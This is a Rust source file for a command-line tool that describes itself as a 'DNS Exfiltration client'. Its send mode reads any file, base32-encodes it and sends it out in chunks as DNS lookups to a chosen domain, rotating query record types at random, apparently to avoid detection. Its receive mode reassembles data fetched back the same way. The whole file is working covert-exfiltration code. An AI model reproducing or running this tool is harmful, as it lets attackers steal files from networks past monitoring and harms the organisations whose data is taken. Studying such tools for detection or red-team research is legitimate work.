use clap::{Parser, Subcommand};
use futures::future::join_all;
use std::fs;
use log::{error, info};
use simple_logger::SimpleLogger;
use rustleak_lib::{
    dns::*,
    utils::{decode_base32, encode_base32, split_data_into_label_chunks},
};
use std::time::Instant;
use rand::distributions::{Distribution, WeightedIndex};
use rand::thread_rng;
const MAX_ATTEMPTS: usize = 10;

#[derive(Parser, Debug)]
#[command(version, about, long_about = None)]
struct Args {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Parser, Debug)]
struct CommonArgs {
    #[arg(short, long)]
    code: String,
    
    #[arg(short, long)]
    filename: String,
    
    #[arg(short, long)]
    domain: String,
}

#[derive(Subcommand, Debug)]
enum Commands {
    /// Send data
    Send(CommonArgs),
    /// Receive data
    Receive(CommonArgs),
}

#[tokio::main]
async fn main() {
    SimpleLogger::new().init().unwrap();
    let args = Args::parse();
    let resolver = get_resolver();

    info!("Starting DNS Exfiltration client");

    match args.command {
        Commands::Send(common_args) => {
            match fs::read(&common_args.filename) {
            Ok(raw_bytes) => {
                info!("File {} exists and is readable", &common_args.filename);
                let labels = split_data_into_label_chunks(&raw_bytes);
                let encoded_labels = encode_base32(labels);
                let total_labels = encoded_labels.len();
            
                let start_time = Instant::now();
                let futures: Vec<_> = encoded_labels.iter().enumerate().map(|(i, label)| {
                let resolver = resolver.clone();
                let code = common_args.code.clone();
                let domain = common_args.domain.clone();
                async move {
                    let mut attempts = 0;
                    loop {
                    tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
                    let query = format!("UPLOAD.{}.{}.{}.{}.{}", label, i, total_labels, code, domain);
            
                    match resolver.lookup(&query, get_random_record_type()).await {
                        Ok(_) => break,
                        Err(_) => {
                        attempts += 1;
                        if attempts >= MAX_ATTEMPTS {
                            error!("Failed to send query after {} attempts: {}", MAX_ATTEMPTS, query);
                            error!("Aborting...");
                            std::process::exit(1);
                        }
                        }
                    }
                    }
                }
                }).collect();

                join_all(futures).await;

                let elapsed = start_time.elapsed().as_secs_f32();
                let byte_rate = (raw_bytes.len() as f32) / elapsed;
                info!("Data sent successfully!");
                info!("Average byte rate: {:.1} bytes/s", byte_rate);
            }
            Err(e) => {
                error!("Error reading file: {}", e);
                return;
            }
            };
        }
        Commands::Receive(common_args) => {
            match fs::OpenOptions::new().write(true).create(true).truncate(false).open(&common_args.filename) {
                Ok(_) => info!("File {} is writable", &common_args.filename),
                Err(e) => {
                    error!("Error opening file for writing: {}", e);
                    return;
                }
            };

            let query = format!("DOWNLOAD.{}.{}", common_args.code, common_args.domain);
            let response = resolver.lookup(&query, hickory_resolver::proto::rr::RecordType::ANY).await;

            let total_fragments: usize = match response {
                Ok(lookup) => {
                    let records = lookup.iter().collect::<Vec<_>>();
                    let record_data = records[0].to_string();
                    record_data.parse::<usize>().unwrap_or_else(|_| {
                        error!("Invalid fragment count response: {}", record_data);
                        std::process::exit(1);
                    })
                }
                Err(_) => {
                    error!("Failed to retrieve fragment count.");
                    return;
                }
            };

            info!("Total fragments to download: {}", total_fragments);

            let start_time = Instant::now();
            let mut received_data: Vec<Option<String>> = vec![None; total_fragments];
            for (seq, data) in received_data.iter_mut().enumerate().take(total_fragments) {
                let mut attempts = 0;
                while attempts < MAX_ATTEMPTS {
                    let query = format!("DOWNLOAD.{}.{}.{}", common_args.code, seq, common_args.domain);
                    tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;

                    match resolver.lookup(&query, hickory_resolver::proto::rr::RecordType::ANY).await {
                        Ok(lookup) => {
                            let records = lookup.iter().collect::<Vec<_>>();
                            let record_data = records[0].to_string();
                            *data = Some(record_data);
                            break;
                        }
                        Err(_) => {
                            attempts += 1;
                        }
                    }
                }

                if attempts >= MAX_ATTEMPTS {
                    error!("Failed to retrieve fragment after {} attempts: {}", MAX_ATTEMPTS, seq);
                    error!("Aborting...");
                    std::process::exit(1);
                }

                let progress = (seq + 1) as f32 / total_fragments as f32 * 100.0;
                let elapsed = start_time.elapsed().as_secs_f32();
                let estimated_total = elapsed / ((seq + 1) as f32 / total_fragments as f32);
                let remaining = estimated_total - elapsed;
                info!(
                    "Progress: {:.1}% - Elapsed: {:.1}s - Remaining: {:.1}s",
                    progress, elapsed, remaining
                );
            }

            let elapsed = start_time.elapsed().as_secs_f32();
            let byte_rate = (total_fragments as f32 * 32.0) / elapsed; // Assuming each fragment is 32 bytes
            let decoded_data = decode_base32(
                received_data.into_iter().flatten().collect(),
            );
            let flattened_data: Vec<u8> = decoded_data.into_iter().flatten().collect();
            fs::write(&common_args.filename, flattened_data).expect("Failed to write data to file");
            info!("Data successfully written to file: {}", common_args.filename);
            info!("Average byte rate: {:.1} bytes/s", byte_rate);
        }
    }
}

fn get_random_record_type() -> hickory_resolver::proto::rr::RecordType {
    let record_types = vec![
        hickory_resolver::proto::rr::RecordType::A,
        hickory_resolver::proto::rr::RecordType::AAAA,
        hickory_resolver::proto::rr::RecordType::CNAME,
        hickory_resolver::proto::rr::RecordType::TXT,
    ];

    let weights = vec![30, 30, 30, 10];
    let dist = WeightedIndex::new(&weights).unwrap();
    let mut rng = thread_rng();
    record_types[dist.sample(&mut rng)]
}